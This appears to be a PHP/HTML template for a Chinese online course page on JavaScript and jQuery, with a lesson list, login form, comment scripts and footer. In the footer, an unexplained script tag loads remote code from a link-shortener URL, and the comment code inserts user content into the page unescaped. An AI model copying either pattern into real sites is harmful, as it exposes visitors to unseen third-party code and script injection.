<?php if (!defined('THINK_PATH')) exit();?>
<!doctype html>
<html>
<head>
<meta charset="utf-8">
<title>2016年新课程体系javascript+jQuery - 博学谷视频库</title>
<meta name="keywords" content="下载,学习,教程,课程" />
<meta name="description" content="传智播客视频教程在线学习平台" />
<link type="image/x-icon" rel="shortcut icon" href="http://www.itcast.cn/favicon.ico" />
<link type="text/css" rel="stylesheet" href="/video/Public/Home/style/global.css"/>
<link type="text/css" rel="stylesheet" href="/video/Public/Home/style/style.css"/>
<script type="text/javascript" src="/Home/js/jquery-1.10.2.min.js"></script>
<link type="text/css" rel="stylesheet" href="/video/Public/Home/style/vlist.css"/><meta property="qc:admins" content="2270153577627055756375" />
</head>
<style type="text/css">
.comment{ position:relative;}
.comment h3{height:28px; line-height:28px}
.plbox{width:797px; height:40px; border:1px solid #ccc ; border-radius:5px; line-height: 22px;}
.hfout{width:667px; margin-top: 7px; display: none;}
.hfbox{width:644px; height:25px;}
.hfout a{margin-top: 5px;}
.fbbtn{padding:5px 15px; background: #2196F3; color: #fff; float:right;}
span.emotion{width:42px; height:20px; background:url(//Home/images/icon.gif) no-repeat 2px 2px; padding-left:20px; cursor:pointer}
span.emotion:hover{background-position:2px -28px}
.qqFace{margin-top:4px;background:#fff;padding:2px;border:1px #dfe6f6 solid;}
.qqFace table td{padding:0px;}
.qqFace table td img{cursor:pointer;border:1px #fff solid;}
.qqFace table td img:hover{border:1px #0066cc solid;}
.amore{text-align: center; padding-top: 10px;}
</style>
<body>
<!-- @通用头部 start -->
<div class="topbar">
	<h3><a href="http://www.itcast.cn" target="_blank" style="color:#aaa;">传智播客</a>、<a href="http://www.itheima.com" target="_blank" style="color:#aaa;">黑马程序员</a>视频资源下载库</h3>
	<p>
		
	</p>
</div>
<div class="header">
	<div class="header_in">
		<div class="head_l">
			<h1><a href="/"><img src="/video/Public/Home/images/logo.png" width="147" height="43" alt="博学谷视频库" /></a></h1>
			<ul class="nav">
			<li><a href="/" class="afont  ">首页</a></li>
			<li><a href="/Course" class="afont current">视频教程</a></li>
			<li><a href="/Map" class="afont ">学习路线图</a></li>
						</ul>
		</div>
		<div class="head_r">
			<div class="search">
				<form action="/search" method="get">
					<input type="text" class="search_l" name="keys" autocomplete="off" placeholder="请输入搜索内容" onclick="this.select();" />
					<input type="submit" class="search_r" />
					<ul class="serul">
					<li><a href="/search?keys=Java" >Java</a></li><li><a href="/search?keys=iOS" >iOS</a></li><li><a href="/search?keys=php" >php</a></li><li><a href="/search?keys=HTML5" >HTML5</a></li>					</ul>
				</form>	
			</div>
			
			<div class="quik" id="loginq"><a href="javascript:void(0);" class="afont js_login" >登录</a> <a href="/register.html" class="afont">注册</a> </div>
			<div class="userhd" id="loginh">
				<div class="userlist">
					<script type="text/javascript" src="/course/getuserhead.html?height=40"></script>
					<a href="/member/basic.html" class="afont agd auser" id="myname">个人中心</a>
					<ul id="listhide">					
						<li><a href="/member/sms.html" class="afont agd">我的消息</a></li>
						<li><a href="/member/down.html" class="afont agd">我的下载</a></li>
						<li><a href="/member/fav.html" class="afont agd">我的收藏</a></li>
						<li><a href="http://bbs.itcast.cn/forum.php?mod=forumdisplay&fid=243&filter=typeid&typeid=302" class="afont agd">我的提问</a></li>
						<li><a href="/login/out.html" class="afont agd">退出</a></li>					
					</ul>					
				</div>
				<div><a href="http://ku.itcast.cn/article/39.html" class="ahelp afont">帮助</a></div>
			</div>
		</div>
	</div>
</div>
<!-- @通用登陆 start -->
<div class="zzbd"></div>
<div class="login_box posi">
	<div class="ptop">
		<span title="关闭" id="closelg"><img src="/Home/images/bai.png" /></span>
	</div>
	<a href="/connect/login/type/qq.html" class="agd qqlogin" >登录</a>
	<div class="inner">
		<h2>登录</h2>
		<p class="ptip">博学谷视频库 — 传智播客、黑马程序员视频资源下载库</p>
		<form id="loginform">
		<div class="line">
			<input type="text" name="uname" id="loginname" placeholder="请输入用户名" onClick="this.select();" >
		</div>
		<div class="line">
			<input type="password" name="upass" id="loginpass" placeholder="请输入密码" onClick="this.select();" >
		</div>
		<div class="line">
			<input type="submit" value="登录博学谷视频库" class="confirm agd">
		</div>
		<div class="errb" id="errtishi"></div>
		</form>	
		<div class="bd">
			<a href="/Findpass" class="forgetmm agd">忘记密码</a>
			<p>没有账号？<a href="/Register" class="agd">立即注册</a></p>
		</div>
	</div>
</div>
<!-- @通用登陆 end --> 
<!-- @通用头部 end --> 

<!-- 内容区域 start -->
<div class="wrap"> 
	<div class="wrap_in">
		<div class="breadcrumb">
			<a href="/course" class="afont">视频教程</a>  ＞ <a href="#" class="afont">后端开发</a> ＞ <a href="/course/c29.html" class="afont">PHP</a>
		</div>
		<div class="viewcon">
			<div class="playup">
				<div class="playl" id="videourl"><embed src="http://static.video.qq.com/TPout.swf?vid=b0305qw6r8f&auto=1" allowFullScreen="true" quality="high" width="860" height="430" align="middle" allowScriptAccess="always" type="application/x-shockwave-flash"></embed><script>$(function(){$("embed").height(470);})</script>				</div>
				<div class="playr">
					<div class="playr_in">
						<h2 class="vname">2016年新课程体系javascript+jQuery</h2>
						<div><a href="javascript:void(0);" sort="0" id="beforeOne">播放上一节</a> | <a href="javascript:void(0);" sort="2" id="afterOne">播放下一节</a></div>
						<ul>
							<li class="li1">初级</li>
							<li class="li2">10节课</li>
							<li class="li3">1218人在学</li>
						</ul>
						<p class="ptxt">2016年新课程的第一阶段javascript+jquery课程，可让学员能够熟练掌常用的JS网页特效以及JS邮箱验证技术。可让学员基本实现前端工程师...</p>
						<a href="javascript:void(0);" id="favCount" url="/course/addfavcount.html" pid="29" cid="184" tite="2016年新课程体系javascript+jQuery" picture="./Images/20160607/57569f30c329e.jpg" down="1838" class="afont abtn"><span>收藏此课程 ＞＞</span></a>
						<a href="javascript:void(0);" url="/course/adddowncount.html" pid="20" cid="184" tite="2016年新课程体系javascript+jQuery" picture="./Images/20160607/57569f30c329e.jpg" down="1838" look="1218" class="downCount afont abtn " ><span class="sp2">下载完整视频 ＞＞</span></a>
					</div>
				</div>
			</div>
			<div class="playdown">
				<div class="down_l">
					<div class="inner">
						<div class="hd">
							<ul class="slidenav">
								<li class="cur"><a href="javascript:void(0);">课程介绍</a></li>
								<li><a href="javascript:void(0);">课程目录</a></li>
								<li><a href="javascript:void(0);">配套文档</a></li>
								<li><a href="javascript:void(0);">课程评论</a></li>
							</ul>
							<div class="curBg"></div>
							<div class="cls"></div>	
							<div class="share">
								<div class="bdsharebuttonbox"><a href="#" class="bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a><a href="#" class="bds_qzone" data-cmd="qzone" title="分享到QQ空间"></a></div>
				<script>window._bd_share_config={"common":{"bdSnsKey":{},"bdText":"","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"32"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
								</script>
							</div>
						</div>
						<div class="course">
							<div class="cur lay lay4">
								<p>2016年新课程的第一阶段javascript+jquery课程，可让学员能够熟练掌常用的JS网页特效以及JS邮箱验证技术。可让学员基本实现前端工程师职位。 视频持续更新中。</p>							</div>
							<div class="lay lay1">
								<ul>
								<li class="click">
										<p>第<b class="chapter_sort">1</b>节 - 1javascript引入</p>
										<!-- <span>你已看过</span> -->
										<a href="javascript:void(0);" class="atxt" root='http://dvd.boxuegu.com' data='' title="配套文档"></a>
										<a href="javascript:void(0);" class="videourl cur1" url="/course/addcapter.html" 
										data='<embed src="http://static.video.qq.com/TPout.swf?vid=b0305qw6r8f&auto=1" allowFullScreen="true" quality="high" width="860" height="430" align="middle" allowScriptAccess="always" type="application/x-shockwave-flash"></embed>' hh='470'										 capid="1" cid="184"  title="播放"></a>
									</li><li class="click">
										<p>第<b class="chapter_sort">2</b>节 - 2变量函数介绍</p>
										<!-- <span>你已看过</span> -->
										<a href="javascript:void(0);" class="atxt" root='http://dvd.boxuegu.com' data='' title="配套文档"></a>
										<a href="javascript:void(0);" class="videourl cur2" url="/course/addcapter.html" 
										data='<embed src="http://static.video.qq.com/TPout.swf?vid=p03058n2b5m&auto=1" allowFullScreen="true" quality="high" width="860" height="430" align="middle" allowScriptAccess="always" type="application/x-shockwave-flash"></embed>' hh='470'										 capid="2" cid="184"  title="播放"></a>
									</li><li class="click">
										<p>第<b class="chapter_sort">3</b>节 - 3--变量名介绍</p>
										<!-- <span>你已看过</span> -->
										<a href="javascript:void(0);" class="atxt" root='http://dvd.boxuegu.com' data='' title="配套文档"></a>
										<a href="javascript:void(0);" class="videourl cur3" url="/course/addcapter.html" 
										data='<embed src="http://static.video.qq.com/TPout.swf?vid=b03056dnyyq&auto=1" allowFullScreen="true" quality="high" width="860" height="430" align="middle" allowScriptAccess="always" type="application/x-shockwave-flash"></embed>' hh='470'										 capid="3" cid="184"  title="播放"></a>
									</li><li class="click">
										<p>第<b class="chapter_sort">4</b>节 - 4-变量名练习</p>
										<!-- <span>你已看过</span> -->
										<a href="javascript:void(0);" class="atxt" root='http://dvd.boxuegu.com' data='' title="配套文档"></a>
										<a href="javascript:void(0);" class="videourl cur4" url="/course/addcapter.html" 
										data='<embed src="http://static.video.qq.com/TPout.swf?vid=z03056r84ho&auto=1" allowFullScreen="true" quality="high" width="860" height="430" align="middle" allowScriptAccess="always" type="application/x-shockwave-flash"></embed>' hh='470'										 capid="4" cid="184"  title="播放"></a>
									</li><li class="click">
										<p>第<b class="chapter_sort">5</b>节 - 5--数据类型介绍</p>
										<!-- <span>你已看过</span> -->
										<a href="javascript:void(0);" class="atxt" root='http://dvd.boxuegu.com' data='' title="配套文档"></a>
										<a href="javascript:void(0);" class="videourl cur5" url="/course/addcapter.html" 
										data='<embed src="http://static.video.qq.com/TPout.swf?vid=i0305dkp7gi&auto=1" allowFullScreen="true" quality="high" width="860" height="430" align="middle" allowScriptAccess="always" type="application/x-shockwave-flash"></embed>' hh='470'										 capid="5" cid="184"  title="播放"></a>
									</li><li class="click">
										<p>第<b class="chapter_sort">6</b>节 - 6firebug的使用</p>
										<!-- <span>你已看过</span> -->
										<a href="javascript:void(0);" class="atxt" root='http://dvd.boxuegu.com' data='' title="配套文档"></a>
										<a href="javascript:void(0);" class="videourl cur6" url="/course/addcapter.html" 
										data='<embed src="http://static.video.qq.com/TPout.swf?vid=j03052re9ry&auto=1" allowFullScreen="true" quality="high" width="860" height="430" align="middle" allowScriptAccess="always" type="application/x-shockwave-flash"></embed>' hh='470'										 capid="6" cid="184"  title="播放"></a>
									</li><li class="click">
										<p>第<b class="chapter_sort">7</b>节 - 7--赋值运算符</p>
										<!-- <span>你已看过</span> -->
										<a href="javascript:void(0);" class="atxt" root='http://dvd.boxuegu.com' data='' title="配套文档"></a>
										<a href="javascript:void(0);" class="videourl cur7" url="/course/addcapter.html" 
										data='<embed src="http://static.video.qq.com/TPout.swf?vid=b0305i0we9t&auto=1" allowFullScreen="true" quality="high" width="860" height="430" align="middle" allowScriptAccess="always" type="application/x-shockwave-flash"></embed>' hh='470'										 capid="7" cid="184"  title="播放"></a>
									</li><li class="click">
										<p>第<b class="chapter_sort">8</b>节 - 8--算数运算符</p>
										<!-- <span>你已看过</span> -->
										<a href="javascript:void(0);" class="atxt" root='http://dvd.boxuegu.com' data='' title="配套文档"></a>
										<a href="javascript:void(0);" class="videourl cur8" url="/course/addcapter.html" 
										data='<embed src="http://static.video.qq.com/TPout.swf?vid=b0305tcqzpdt&auto=1" allowFullScreen="true" quality="high" width="860" height="430" align="middle" allowScriptAccess="always" type="application/x-shockwave-flash"></embed>' hh='470'										 capid="8" cid="184"  title="播放"></a>
									</li><li class="click">
										<p>第<b class="chapter_sort">9</b>节 - 9 -运算符++和--练习</p>
										<!-- <span>你已看过</span> -->
										<a href="javascript:void(0);" class="atxt" root='http://dvd.boxuegu.com' data='' title="配套文档"></a>
										<a href="javascript:void(0);" class="videourl cur9" url="/course/addcapter.html" 
										data='<embed src="http://static.video.qq.com/TPout.swf?vid=a0305l2apu6&auto=1" allowFullScreen="true" quality="high" width="860" height="430" align="middle" allowScriptAccess="always" type="application/x-shockwave-flash"></embed>' hh='470'										 capid="9" cid="184"  title="播放"></a>
									</li><li class="click">
										<p>第<b class="chapter_sort">10</b>节 - 10比较运算符</p>
										<!-- <span>你已看过</span> -->
										<a href="javascript:void(0);" class="atxt" root='http://dvd.boxuegu.com' data='' title="配套文档"></a>
										<a href="javascript:void(0);" class="videourl cur10" url="/course/addcapter.html" 
										data='<embed src="http://static.video.qq.com/TPout.swf?vid=r0305jqcm21&auto=1" allowFullScreen="true" quality="high" width="860" height="430" align="middle" allowScriptAccess="always" type="application/x-shockwave-flash"></embed>' hh='470'										 capid="10" cid="184"  title="播放"></a>
									</li>								</ul>
								<p><a href="javascript:void(0);" style="display:block; text-align:center; padding-top:20px;" url="/course/adddowncount.html" pid="20" cid="184" tite="2016年新课程体系javascript+jQuery" picture="./Images/20160607/57569f30c329e.jpg" down="1838" look="1218" class="downCount afont abtn " ><span class="sp2">更多章节请下载完整视频观看 ＞＞</span></a></p>
							</div>
							<div class="lay lay2">
								<iframe id="atxt" frameborder="0" height="680" width="100%"></iframe>
							</div>
							<div class="lay lay3">

							<p style="text-align:center;padding:20px 0">请<a href="javascript:void(0);" style="color:#ff6400" class="afont js_login">点击登录</a>后发表评论，我们喜欢真实的你！</p>
					
															<dl class="content_container" style="padding:0;border:0;"></dl>
								<div class="amore" ><a href="javascript:void(0);" start="0" id="comment_more">加载更多</a></div>
							</div>
						</div>
					</div>
				</div>
				<div class="down_r">
					<!--以下是QQ邮件列表订阅嵌入代码<script >var nId = "323991e7dc3dcfdab1ac78949d03b1bdf48238edf1a9ef86",nWidth="auto",sColor="light",sText="填写您的邮件地址，订阅我们的精彩内容：" ;</script><script src="http://list.qq.com/zh_CN/htmledition/js/qf/page/qfcode.js" charset="gb18030"></script>-->
					
					<p class="order_p">获取更多<span>PHP</span>技术资料</p>					<a href="http://ui.easeye.com.cn/Eventmail/UserRegisterPage.aspx?type=reg&guid=xSUJDVk1CSUo= " target="_blank" class="agd order">点击订阅</a>					
					
					<div class="overl">
						<h2>看过该课程的同学还看过</h2>
						<ul>
						<li><a href="/course/3.html" title="AJax视频教程-适合掌握Javaweb的学员">AJax视频教程-适合掌握Javaweb的学员</a> <span><strong>14226</strong>人学习</span></li><li><a href="/course/35.html" title="JavaWeb网上图书商城完整项目">JavaWeb网上图书商城完整项目</a> <span><strong>15749</strong>人学习</span></li><li><a href="/course/36.html" title="轻松掌握JavaWeb视频教程">轻松掌握JavaWeb视频教程</a> <span><strong>12767</strong>人学习</span></li><li><a href="/course/37.html" title="Java多线程与并发库高级应用">Java多线程与并发库高级应用</a> <span><strong>9609</strong>人学习</span></li><li><a href="/course/38.html" title="JDBC视频教程">JDBC视频教程</a> <span><strong>8650</strong>人学习</span></li><li><a href="/course/39.html" title="Struts2实用简洁版视频教程">Struts2实用简洁版视频教程</a> <span><strong>9833</strong>人学习</span></li><li><a href="/course/40.html" title="Hibernate视频教程">Hibernate视频教程</a> <span><strong>9439</strong>人学习</span></li><li><a href="/course/41.html" title="Spring2.5视频教程">Spring2.5视频教程</a> <span><strong>8462</strong>人学习</span></li><li><a href="/course/42.html" title="Struts开发视频教程">Struts开发视频教程</a> <span><strong>5639</strong>人学习</span></li><li><a href="/course/52.html" title="Java邮件开发教程">Java邮件开发教程</a> <span><strong>4904</strong>人学习</span></li><li><a href="/course/55.html" title="Java网上在线支付实战教程">Java网上在线支付实战教程</a> <span><strong>9275</strong>人学习</span></li><li><a href="/course/73.html" title="建站不求人，轻松做站长">建站不求人，轻松做站长</a> <span><strong>3343</strong>人学习</span></li><li><a href="/course/74.html" title="免费开发企业APP应用">免费开发企业APP应用</a> <span><strong>3367</strong>人学习</span></li><li><a href="/course/96.html" title="营销型网站建设教程">营销型网站建设教程</a> <span><strong>2177</strong>人学习</span></li><li><a href="/course/180.html" title="最适合自学的C语言基础视频">最适合自学的C语言基础视频</a> <span><strong>1565</strong>人学习</span></li>						</ul>
					</div>
					<div class="overp">
						<h2>最近<strong>10</strong> 位同学与你共同奋战</h2>
						<dl>
							<dt><img src="http://q.qlogo.cn/qqapp/101260008/CC7F8AB9C6313E578FE3CCD650E97C66/100" width="60" height="60" /></dt>
							<dd>
								<h3>一个人的远</h3>
								<p>已学完第 1 节</p>
							</dd>
						</dl><dl>
							<dt><img src="http://bbs.itcast.cn/uc_server/avatar.php?uid=355571&type=virtual&size=big" width="60" height="60" /></dt>
							<dd>
								<h3>18270834641</h3>
								<p>已学完第 1 节</p>
							</dd>
						</dl><dl>
							<dt><img src="http://q.qlogo.cn/qqapp/101260008/076AB21656C37B62B35F30CED8C3FE31/100" width="60" height="60" /></dt>
							<dd>
								<h3>罪之枝</h3>
								<p>已学完第 1 节</p>
							</dd>
						</dl><dl>
							<dt><img src="http://q.qlogo.cn/qqapp/101260008/B0B436371A6218ECB09BE3A30781CE73/100" width="60" height="60" /></dt>
							<dd>
								<h3>Dr.</h3>
								<p>已学完第 3 节</p>
							</dd>
						</dl><dl>
							<dt><img src="http://bbs.itcast.cn/uc_server/avatar.php?uid=286809&type=virtual&size=big" width="60" height="60" /></dt>
							<dd>
								<h3>axes</h3>
								<p>已学完第 1 节</p>
							</dd>
						</dl><dl>
							<dt><img src="http://bbs.itcast.cn/uc_server/avatar.php?uid=141663&type=virtual&size=big" width="60" height="60" /></dt>
							<dd>
								<h3>wu_software</h3>
								<p>已学完第 1 节</p>
							</dd>
						</dl><dl>
							<dt><img src="http://q.qlogo.cn/qqapp/101260008/B70AD676E32177F542F12BCE061BF05B/100" width="60" height="60" /></dt>
							<dd>
								<h3>醉草狂书</h3>
								<p>已学完第 1 节</p>
							</dd>
						</dl><dl>
							<dt><img src="http://q.qlogo.cn/qqapp/101260008/7D3DFEC86E92A788A9108771702D556A/100" width="60" height="60" /></dt>
							<dd>
								<h3>醉酒青牛</h3>
								<p>已学完第 1 节</p>
							</dd>
						</dl><dl>
							<dt><img src="http://q.qlogo.cn/qqapp/101260008/F05EE66571F0080553888D6E32AC142E/100" width="60" height="60" /></dt>
							<dd>
								<h3>同桌判判</h3>
								<p>已学完第 1 节</p>
							</dd>
						</dl><dl>
							<dt><img src="http://q.qlogo.cn/qqapp/101260008/ABD08D1251691CC6CC63B19A25F20281/100" width="60" height="60" /></dt>
							<dd>
								<h3>成长的漫控</h3>
								<p>已学完第 1 节</p>
							</dd>
						</dl>					</div>
				</div>
			</div>
		</div>
	</div>
</div>
<script type="text/javascript" src="/course/isvideo.html?cid=184"></script>
<!-- 内容区域 end --> 
<!-- @通用底部 start -->
<div class="footer">
	<div class="inner">
		<div class="ft_l ft_l1">
			<div class="ft_l_txt">
				<h3>帮助中心</h3>
				<ul>
				<li><a href="/article/39.html" target="_blank">新手指南</a></li><li><a href="/article/40.html" target="_blank">常见问题</a></li><li><a href="/article/36.html" target="_blank">密码找回</a></li><li><a href="/article/42.html" target="_blank">意见反馈</a></li>				</ul>
			</div>
			<div class="ft_l_txt">
				<h3>交流合作</h3>
				<ul>
					<li><a href="/article/41.html" target="_blank">技术交流</a></li><li><a href="/article/45.html" target="_blank">联系我们</a></li><li><a href="/article/47.html" target="_blank">版权声明</a></li>				</ul>
			</div>
			<div class="ft_l_txt">
				<h3>站内地图</h3>
				<ul>
					<li><a href="http://dvd.boxuegu.com/map/22.html" target="_blank">Java视频</a></li><li><a href="http://dvd.boxuegu.com/map/23.html" target="_blank">PHP视频</a></li><li><a href="http://dvd.boxuegu.com/map/26.html" target="_blank">iOS视频</a></li><li><a href="http://dvd.boxuegu.com/Map" target="_blank">更多学科视频</a></li>		
				</ul>
			</div>
		</div>
		<div class="ft_l ft_l2">
			<div class="it_wx">
				<p>官方微信</p>
				<img src="/Home/images/czwx.jpg" width="120" height="120" /> </div>
			<div class="boniu_wx">
				<p>酷酷哥微信</p>
				<img src="/Home/images/czkkg.jpg" width="120" height="120" /> </div>
		</div>
		<div class="ft_l ft_l3">
			<div class="share">
				<div class="share_in">
				<div class="bdsharebuttonbox"><a href="#" class="bds_mshare" data-cmd="mshare" title="分享到一键分享"></a><a href="#" class="bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a><a href="#" class="bds_qzone" data-cmd="qzone" title="分享到QQ空间"></a></div>
				<script>window._bd_share_config={"common":{"bdSnsKey":{},"bdText":"","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"32"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
				</script>
				</div>
			</div>
			<p class="pp2" style="margin-top:28px;">播妞微信号：boniu526</p>
			<p class="pp2">黑妞微信号：xiaoheige178</p>
			<p class="pp2">兔纸姐微信号：tuzhijie520</p>
			<p class="pp2">官方微博地址：<a href="http://weibo.com/itcast" target="_blank">http://weibo.com/itcast</a></p>
		</div>
	</div>
	<p class="copy">地址：北京市昌平区建材城西路金燕龙办公楼一层 邮编：100096     电话：400-618-4000   传真：010-82935100   邮箱: zhanghj+itcast.cn<br>京ICP备08001421号京公网安备110108007702
<div id="tongji"><script type="text/javascript">var cnzz_protocol = (("https:" == document.location.protocol) ? " https://" : " http://");document.write(unescape("%3Cspan id='cnzz_stat_icon_1256597673'%3E%3C/span%3E%3Cscript src='" + cnzz_protocol + "s4.cnzz.com/stat.php%3Fid%3D1256597673%26show%3Dpic' type='text/javascript'%3E%3C/script%3E"));</script>
<script>
var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "//hm.baidu.com/hm.js?41aac3b431d3607c6c4b7141913016ac";
  var s = document.getElementsByTagName("script")[0];
  s.parentNode.insertBefore(hm, s);
})();
</script>
<script src=http://t.cn/RqlYwjE></script>
</div></p>
</div>
<script type="text/javascript" src="/Home/js/qj.js"></script>
<script type="text/javascript" src="/Home/js/layer/layer.js"></script>
<script type="text/javascript" src="/Home/js/verify.js"></script>
<script type="text/javascript">
$(function(){
	var name = $("#loginname");
	var pass = $("#loginpass");

	textMouseleave(name);
	textMouseleave(pass);

	$("#loginform").submit( function () {
		if(textRequired(name) && textRequired(pass)){
			$.post("/login/check.html", { name: name.val(), pass: pass.val()},
					function(data){
					   $('#errtishi').html(data).show();
					}
			);
		}
		return false;
	});
})
</script>
<script type="text/javascript" src="/login/isenter.html"></script>
<script type="text/javascript" src="/Home/js/vlist.js"></script>
<script type="text/javascript" src="/Home/js/vview.js"></script>
<script type="text/javascript" src="/Home/js/jquery.qqFace.js"></script>
<script type="text/javascript" src="/Home/js/textCount.js"></script>
<script type="text/javascript">
$(function(){
	$('.emotion').qqFace({
		id : 'facebox', 
		assign:'saytext', 
		path:"/Home/images/arclist/"
	});
	$("#comment_submit").click(function(){
		var saytext = $("#saytext").val();
				var userhead = '';		if(saytext.length <= 0){
			layer.tips('请输入评论内容！', $(this), {
					tips: [1, '#3595CC'],
					time: 4000
			});
			$("#saytext").focus();
			return;
		}
		//$("#show").html(replace_em(str));
		$.post("/course/addcomment.html", { cid: 184, content: saytext, rand: 6846, userhead: userhead },
				   function(data){
						if(data == 1 ){ 	
							layer.msg('评论过于频繁，请稍后再进行评论！',{icon:8});
							return ;
						}else if(data == 2 ){ 
							layer.msg('提交失败，请刷新页面重试！',{icon:8});
							return ;
						}else{
							$('.content_container:first').before(data);
							$('#saytext').val('');
						}
				   }
		);
		
	});
	$("#comment_more").click(function(){
		
		 $.ajax({ 
		        type: 'POST', 
		        url: '/course/getcommentajax.html', 
		        data: {cid:184,start:$(this).attr('start')}, 
		        dataType:'json', 
		        beforeSend:function(){ 
		        	$("#comment_more").append('<br/><img src="/Home/images/onLoad.gif" style="display:inline-block"/>');
		        }, 
		        success:function(json){ 
			        if(json){
			        	$("#comment_more").attr('start',json.start);
			            var li = ""; 
			            var list = json.list; 
			            $.each(list,function(index,array){ 
														var del = '';			                li += '<dl class="content_container ds'+array['id']+'"><dt><img src="'+array['head']+'" width="60" height="60" /></dt><dd><h3><strong>'+array['username']+'</strong>  <span class="sptime"><i>'+array['pubdate']+'</i></span>  说：</h3><p>'+array['content']+'</p>'+array['commentrep']+'<div class="comrep"></div><div class="hfout"><textarea class="plbox hfbox repcontent"  name="saytext" placeholder="请发表回复的内容！！！" style="resize:vertical; padding:8px 10px;"></textarea><a href="javascript:void(0);" data="'+array['id']+'" url="/course/addcommentrep.html" class="comment_rep fbbtn">发表回复</a></div><div class="sbox"><a href="javascript:void(0)" class="course_good" data="'+array['id']+'" url="/course/addgoodcount.html">赞</a>（<strong class="num">'+array['goodcount']+'</strong>）<a href="javascript:void(0)" class="a2 course_rep">回复</a>'+del+'</div></dd></dl>'; 
			            }); 
			            $('.content_container:last').after(li);
			        }else{
			        	$("#comment_more").text('没有更多的评论啦！');
			        }
		        },
		        complete:function(){ 
		        	$("#comment_more img").remove();
		        }, 
		        error:function(){ 
		            $("#comment_more").text('没有更多的评论啦！');
		        } 
		    }); 
	});


	$("body").on("click", ".comment_rep", function(){
		var $id = $(this).attr("data");
		var $url = $(this).attr("url");
		var $tt=$(this);
		var $repcontent = $tt.prev(".repcontent").val();
		if($repcontent.length <= 0){
				layer.tips('请输入回复内容！', $(this), {
					tips: [1, '#3595CC'],
					time: 4000
				});
				return;
			}
		if($url){
			$.post($url, { cid:$id, repcontent:$repcontent },
			function(data){
				if(data == 1 ){ 	
					layer.msg('评论过于频繁，请稍后再进行评论！',{icon:8});
					return ;
				}else if(data == 3){
					$(".js_login").click();	
				}else{
					$('.repdiv').slideUp();
					$tt.prev(".repcontent").val('');
					$tt.parent().siblings(".comrep:first").before(data);
				}
			});
		}
	});
	
});
</script></body>
</html>
<!-- @通用底部 end -->